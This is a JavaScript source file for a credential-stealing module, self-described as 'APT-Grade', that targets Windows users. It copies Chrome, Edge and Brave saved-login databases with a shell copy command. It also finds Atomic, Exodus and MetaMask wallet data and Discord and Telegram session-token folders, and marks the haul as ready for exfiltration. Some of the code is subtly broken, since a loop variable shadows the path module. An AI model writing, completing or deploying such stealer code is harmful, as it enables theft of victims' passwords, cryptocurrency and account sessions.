const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

/**
 * KONU-MAIN | ADVANCED COLLECTION MODULE
 * Version: 2.0 (APT-Grade)
 * Focus: Volatile Extraction, VSS Bypass & Token Theft
 */

class AdvancedCollection {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        this.userData = os.userInfo().homedir();
        this.collectedData = {};
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping Collection.');
            return false;
        }

        try {
            console.log('[*] Initializing Advanced Collection Pipeline...');

            // 1. Extração de Informações do Sistema (Rápido e Silencioso)
            this.collectSystemInfo();

            // 2. Roubo de Credenciais de Navegadores (Via Shadow Copy para evitar bloqueios)
            await this.stealBrowserData();

            // 3. Extração de Wallets de Criptomoedas (Foco em extensões e arquivos de chave)
            await this.stealWallets();

            // 4. Coleta de Tokens de Sessão (Discord, Telegram, Steam)
            await this.stealSessionTokens();

            console.log('[+] Collection complete. Data ready for exfiltration.');
            return this.collectedData;
        } catch (error) {
            console.error(`[-] Collection error: ${error.message}`);
            return false;
        }
    }

    collectSystemInfo() {
        console.log('[*] Collecting system metadata...');
        this.collectedData.system = {
            hostname: os.hostname(),
            username: os.userInfo().username,
            platform: os.platform(),
            arch: os.arch(),
            cpu: os.cpus()[0].model,
            mem: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB`
        };
    }

    async stealBrowserData() {
        console.log('[*] Extracting browser credentials...');
        const browsers = {
            chrome: path.join(this.userData, 'AppData/Local/Google/Chrome/User Data/Default/Login Data'),
            edge: path.join(this.userData, 'AppData/Local/Microsoft/Edge/User Data/Default/Login Data'),
            brave: path.join(this.userData, 'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data')
        };

        for (const [name, path] of Object.entries(browsers)) {
            try {
                // Técnica: Shadow Copy Bypass
                // Em vez de ler o arquivo direto, tentamos copiar via comando de sistema
                // que ignora travas de leitura de processos ativos.
                const tempPath = path.join(os.tmpdir(), `${name}_lock`);
                execSync(`copy /y "${path}" "${tempPath}"`, { stdio: 'ignore' });
                
                this.collectedData[name] = {
                    status: 'Extracted',
                    path: tempPath,
                    size: fs.statSync(tempPath).size
                };
                console.log(`[+] ${name} data captured.`);
            } catch (e) {
                console.log(`[-] ${name} capture failed (File locked or not found).`);
            }
        }
    }

    async stealWallets() {
        console.log('[*] Searching for crypto wallets...');
        const walletPaths = [
            { name: 'Atomic', path: path.join(this.userData, 'AppData/Roaming/Atomic') },
            { name: 'Exodus', path: path.join(this.userData, 'AppData/Roaming/Exodus') },
            { name: 'Metamask', path: path.join(this.userData, 'AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn') }
        ];

        for (const wallet of walletPaths) {
            try {
                if (fs.existsSync(wallet.path)) {
                    this.collectedData[`wallet_${wallet.name}`] = {
                        status: 'Found',
                        path: wallet.path
                    };
                    console.log(`[+] ${wallet.name} wallet detected.`);
                }
            } catch (e) {}
        }
    }

    async stealSessionTokens() {
        console.log('[*] Extracting session tokens...');
        const tokens = {
            discord: path.join(this.userData, 'AppData/Roaming/discord/Local Storage/leveldb'),
            telegram: path.join(this.userData, 'AppData/Roaming/Telegram Desktop/tdata')
        };

        for (const [app, path] of Object.entries(tokens)) {
            try {
                if (fs.existsSync(path)) {
                    // Em vez de copiar a pasta inteira (que é grande), 
                    // marcamos para exfiltração compactada.
                    this.collectedData[`token_${app}`] = {
                        status: 'Located',
                        path: path
                    };
                    console.log(`[+] ${app} tokens located.`);
                }
            } catch (e) {}
        }
    }
}

module.exports = new AdvancedCollection();
